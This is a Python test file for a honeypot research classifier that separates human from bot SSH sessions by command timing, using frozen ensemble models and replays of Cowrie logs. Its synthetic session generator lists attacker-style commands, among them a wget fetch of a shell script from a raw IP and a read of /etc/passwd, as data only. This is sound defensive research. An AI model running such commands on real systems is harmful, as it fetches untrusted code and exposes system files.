#!/usr/bin/env python3
"""test_classify_vote.py - checks of live_classify.py with the frozen hard-vote Model E
(PREREG_AMENDMENT_2) and, as a regression check, with the frozen Model A3.

Run from ~/deception-framework:   python3 orchestrator/tests/test_classify_vote.py
(also collected by pytest). Reads only; writes temporary config files in /tmp.

  1  E loads: hard vote, 3 voters, A3 features, no login time, no TTY, same k as A3,
     SHA-256 = the one written by 16_ensemble_v2.py fit (reports/v2/ensemble/model_E.json)
  2  a wrong SHA-256 in the config stops the classifier; a k other than the frozen k stops it
  3  fewer than k input lines -> Uncertain, no score
  4  synthetic sessions: live verdict = E.predict; live p_human = share of Human votes
     counted member by member (an independent path from transform)
  5  p_human is in {0, 1/3, 2/3, 1}; Human exactly when p_human >= 2/3 (theta 0.5)
  6  the login time does not change E's result (E has no login feature)
  7  real replay: fresh participants and red-team bot from the raw Cowrie log ->
     same E label and vote share as 16_ensemble_v2.py score-humans, same A3 label
  8  A3 unchanged: verdict = A3.predict, p_human = predict_proba (old behaviour)
  9  theta other than 0.5: Human only when p_human >= theta
"""
import glob
import importlib.util
import json
import os
import sys
import tempfile

import numpy as np
import pandas as pd
import yaml

TESTS = os.path.dirname(os.path.abspath(__file__))
ORCH = os.path.dirname(TESTS)
ROOT = os.path.dirname(ORCH)
sys.path.insert(0, ORCH)
import live_classify as lc  # noqa: E402

A3 = ["log_gap_median", "gap_cv", "log_max_rate"]
E_PATH, A3_PATH = "models/model_E_v2.joblib", "models/model_A3_v2.joblib"
COWRIE = os.environ.get("COWRIE_LOG", os.path.expanduser("~/cowrie/var/log/cowrie"))
R = np.random.default_rng(20261021)


def p(*parts):
    return os.path.join(ROOT, *parts)


def e_sha():
    return json.load(open(p("reports/v2/ensemble/model_E.json")))["model_E_sha256"]


def a3_sha():
    return lc.sha256(p(A3_PATH))


def frozen_k(model):
    return int(lc.joblib.load(p(model))["meta"]["k"])


def make(model, sha, theta=0.5, k=None):
    k = frozen_k(model) if k is None else k
    fd, path = tempfile.mkstemp(suffix=".yaml")
    with os.fdopen(fd, "w") as f:
        yaml.safe_dump({"classifier": {"k": k, "theta": theta, "model_json": model,
                                       "model_json_sha256": sha, "use_b": False}}, f)
    try:
        return lc.Classifier(path)
    finally:
        os.remove(path)


def synthetic(n=400):
    """Sessions with gaps from milliseconds to a minute (bot-like and human-like)."""
    cmds = ["uname -a", "id", "ls -la", "cat /etc/passwd", "ps aux", "w", "df -h",
            "cd /tmp && wget http://1.2.3.4/x.sh", "cat /proc/cpuinfo | grep name | wc -l"]
    out = []
    for i in range(n):
        t, ev = 1.79e9 + 1000 * i, []
        scale = 10 ** R.uniform(-3, 1.8)
        for _ in range(int(R.integers(5, 9))):
            t += scale * R.lognormal(0, R.uniform(0.01, 1.0))
            ev.append((t, str(R.choice(cmds))))
        out.append((ev, 1.79e9 + 1000 * i - R.uniform(0.05, 10)))
    return out


def features(c, ev):
    lines, _, _ = lc.fv2.input_lines(ev)
    f = lc.fv2.json_prefix_features(lines, None, c.k)
    return np.array([[f[x] for x in A3]], dtype=float)


def manual_share(clf, X):
    """Human votes counted from each fitted member separately."""
    votes = [clf.classes_[int(est.predict(X)[0])] for est in clf.estimators_]
    return sum(v == lc.HUMAN for v in votes) / len(votes)


# ---------------------------------------------------------------- tests
def test_1_loads_E():
    c = make(E_PATH, e_sha())
    m = c.json_model
    assert m.name == "E" and m.hard_vote and m.score == "vote_share"
    assert len(m.clf.estimators_) == 3 and m.meta["voting"] == "hard"
    assert m.features == A3 and not m.needs_login and not m.needs_tty
    assert m.k == c.k == frozen_k(A3_PATH) and m.sha == e_sha()
    assert not hasattr(m.clf, "predict_proba")


def test_2_wrong_sha_stops():
    try:
        make(E_PATH, "0" * 64)
    except RuntimeError as err:
        assert "mismatch" in str(err)
        return
    raise AssertionError("a wrong SHA-256 was accepted")


def test_2b_wrong_k_stops():
    try:
        make(E_PATH, e_sha(), k=frozen_k(E_PATH) + 1)
    except RuntimeError as err:
        assert "frozen at k" in str(err)
        return
    raise AssertionError("a k different from the frozen k was accepted")


def test_3_pending():
    c = make(E_PATH, e_sha())
    ev = [(1.0 + i, "id") for i in range(c.k - 1)]
    r = c.classify(ev)
    assert r["verdict"] == "Uncertain" and r["p_human"] is None and r["n_lines"] == c.k - 1


def test_4_synthetic_identity():
    c = make(E_PATH, e_sha())
    clf = c.json_model.clf
    n_h = 0
    for ev, _ in synthetic():
        X = features(c, ev)
        r = c.classify(ev)
        want = "Human" if int(clf.predict(X)[0]) == lc.HUMAN else "Bot"
        assert r["verdict"] == want, (r, want)
        assert abs(r["p_human"] - round(manual_share(clf, X), 4)) < 1e-9
        n_h += r["verdict"] == "Human"
    assert 0 < n_h < 400, f"synthetic set is one-sided ({n_h} Human) - test is not informative"


def test_5_vote_values_and_majority():
    c = make(E_PATH, e_sha())
    seen = set()
    for ev, _ in synthetic():
        r = c.classify(ev)
        assert r["p_human"] in (0.0, 0.3333, 0.6667, 1.0), r
        assert (r["verdict"] == "Human") == (r["p_human"] >= 0.6667)
        seen.add(r["p_human"])
    assert {0.0, 1.0} <= seen


def test_6_login_time_ignored():
    c = make(E_PATH, e_sha())
    for ev, login in synthetic(100):
        assert c.classify(ev, login_ts=login) == c.classify(ev, login_ts=None)


def _replay_rows():
    files = sorted(glob.glob(os.path.join(COWRIE, "cowrie.json*")))
    if not files:
        raise AssertionError(f"no Cowrie log in {COWRIE} (set COWRIE_LOG)")
    spec = importlib.util.spec_from_file_location("lab", p("scripts", "10_build_lab_v2.py"))
    lab = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(lab)
    S, _ = lab.load(COWRIE)
    rows = pd.concat([pd.read_csv(p("reports/v2/ensemble", f))
                      for f in ("fresh_sessions.csv", "redteam_sessions.csv")])
    return S, rows


def test_7_real_replay():
    S, rows = _replay_rows()
    ce, ca = make(E_PATH, e_sha()), make(A3_PATH, a3_sha())
    for _, row in rows.iterrows():
        s = S[row.session]
        re_, ra = ce.classify(s["cmds"], login_ts=s["login"]), ca.classify(s["cmds"], login_ts=s["login"])
        assert re_["verdict"] == ("Human" if row.E == 1 else "Bot"), (row.session, re_)
        assert abs(re_["p_human"] - round(float(row.E_vote_share), 4)) < 1e-9, (row.session, re_)
        assert ra["verdict"] == ("Human" if row.A3 == 1 else "Bot"), (row.session, ra)
    print(f"      replayed {len(rows)} sessions (fresh + red team)")


def test_8_A3_unchanged():
    c = make(A3_PATH, a3_sha())
    m = c.json_model
    assert m.name != "E" and not m.hard_vote and m.score == "probability"
    for ev, login in synthetic(200):
        X = features(c, ev)
        r = c.classify(ev, login_ts=login)
        assert r["verdict"] == ("Human" if int(m.clf.predict(X)[0]) == lc.HUMAN else "Bot")
        assert r["p_human"] == round(float(m.clf.predict_proba(X)[0][m.human_col]), 4)


def test_9_theta():
    c = make(E_PATH, e_sha(), theta=0.9)
    for ev, _ in synthetic(200):
        r = c.classify(ev)
        assert (r["verdict"] == "Human") == (r["p_human"] >= 0.9)


if __name__ == "__main__":
    os.chdir(ROOT)
    tests = [(n, f) for n, f in sorted(globals().items()) if n.startswith("test_")]
    failed = 0
    for n, f in tests:
        try:
            f()
            print(f"PASS  {n}")
        except Exception as err:  # noqa: BLE001
            failed += 1
            print(f"FAIL  {n}: {type(err).__name__}: {err}")
    print(f"{len(tests) - failed} passed, {failed} failed")
    sys.exit(1 if failed else 0)
